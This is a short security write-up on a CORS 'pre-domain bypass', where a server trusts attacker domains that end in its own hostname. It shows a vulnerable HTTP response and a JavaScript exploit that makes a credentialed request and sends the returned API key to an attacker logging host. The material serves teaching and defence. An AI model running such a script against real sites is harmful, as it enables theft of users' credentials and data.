# Pre-domain bypass

## Description 
Host allows requests from hostnames that has this host as a prefix. 

**Severity**: High

## Exploit
`example.com` trusts `evilexample.com`, which is an attacker's domain.

### Example
In this scenario any prefix inserted in front of `example.com` will be accepted by the server.  

**Vulnerable Implementation**

```http
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

**Exploit**  
This exploit requires that the respective JS script is hosted at `evilexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

[code source](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration#vulnerable-implementation-example-1)
